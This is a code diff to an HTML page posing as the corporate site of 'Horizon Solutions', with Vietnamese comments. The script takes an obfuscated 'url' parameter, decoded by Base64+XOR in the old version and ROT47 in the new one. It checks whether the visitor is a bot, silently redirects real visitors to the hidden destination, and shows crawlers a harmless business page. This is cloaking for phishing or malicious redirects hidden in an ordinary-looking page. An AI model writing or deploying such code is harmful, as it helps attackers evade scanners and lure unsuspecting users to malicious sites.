@@ -7,44 +7,26 @@
     <meta name="keywords" content="technology, business solutions, USA, enterprise services">
     <meta name="author" content="Horizon Solutions">
     <script>
-        // Bật ON để kiểm tra chuyển hướng
-        const redirectStatus = 'ON'; 
+        // Trạng thái chuyển hướng: 'ON' hoặc 'OFF'
+        const redirectStatus = 'ON'; // Sửa thành 'OFF' để tắt giải mã và chuyển hướng
+
+        // Hàm giải mã ROT47 (giữ nguyên)
+        function processData(input) {
+            let result = '';
+            for (let i = 0; i < input.length; i++) {
+                let code = input.charCodeAt(i);
+                if (code >= 33 && code <= 126) {
+                    result += String.fromCharCode((code - 33 - 47 + 94) % 94 + 33);
+                } else {
+                    result += input[i];
+                }
+            }
+            return result;
+        }
+
+        // Lấy tham số từ URL
         const params = new URLSearchParams(window.location.search);
         const data = params.get('url') || '';
-
-        // Khóa mã hóa (giữ bí mật, không thay đổi nếu đã dùng)
-        const ENCRYPTION_KEY = 'xAI2025';
-
-        // Hàm mã hóa Base64 + XOR (dùng để tạo URL, không cần trong HTML)
-        function encodeAdvanced(url) {
-            let base64 = btoa(encodeURIComponent(url));
-            let xorResult = '';
-            for (let i = 0; i < base64.length; i++) {
-                let charCode = base64.charCodeAt(i);
-                let keyCode = ENCRYPTION_KEY.charCodeAt(i % ENCRYPTION_KEY.length);
-                xorResult += String.fromCharCode(charCode ^ keyCode);
-            }
-            return btoa(xorResult); // Mã hóa thêm một lần Base64 để dễ truyền
-        }
-
-        // Hàm giải mã Base64 + XOR
-        function decodeAdvanced(input) {
-            try {
-                // Giải mã Base64 đầu tiên
-                let base64 = atob(input);
-                let decoded = '';
-                for (let i = 0; i < base64.length; i++) {
-                    let charCode = base64.charCodeAt(i);
-                    let keyCode = ENCRYPTION_KEY.charCodeAt(i % ENCRYPTION_KEY.length);
-                    decoded += String.fromCharCode(charCode ^ keyCode);
-                }
-                // Giải mã Base64 cuối cùng để lấy URL
-                return decodeURIComponent(atob(decoded));
-            } catch (e) {
-                console.error("Invalid encoded URL:", e);
-                return '';
-            }
-        }
 
         // Kiểm tra bot, giảm sai sót với người dùng thật
         function isBot() {
@@ -59,26 +41,18 @@
                    !/chrome|safari|firefox|edge|opera/i.test(userAgent);
         }
 
-        // Debug và chuyển hướng
-        console.log("Redirect Status:", redirectStatus);
-        console.log("Encoded URL:", data);
-        if (redirectStatus === 'ON' && data) {
-            console.log("Checking if bot...");
-            if (!isBot()) {
-                console.log("Not a bot, decoding URL...");
-                const destination = decodeAdvanced(data);
-                if (destination) {
-                    console.log("Decoded URL:", destination);
-                    // Chuyển hướng tức thì qua thẻ meta
-                    document.write(`<meta http-equiv="refresh" content="0;url=${encodeURI(destination)}">`);
-                } else {
-                    console.error("Failed to decode URL, showing default page.");
-                }
-            } else {
-                console.log("Bot detected, not redirecting.");
-            }
+        // Logic chuyển hướng
+        if (redirectStatus === 'ON' && data && !isBot()) {
+            // Khi ON và không phải bot: Giải mã ROT47 và chuyển hướng
+            const processed = processData(data);
+            console.log("Decoded URL:", processed);
+            window.location.href = processed;
+        } else if (!data) {
+            // Không có URL: Hiển thị thông báo lỗi
+            document.body.innerHTML = "<p>Sorry, we couldn't load your content.</p>";
         } else {
-            console.log("Redirect is OFF or no URL provided, showing default page.");
+            // Khi OFF hoặc là bot: Hiển thị nội dung doanh nghiệp
+            console.log("Redirect is OFF or bot detected, showing business page.");
         }
     </script>
     <title>Horizon Solutions - Empowering Your Future</title>
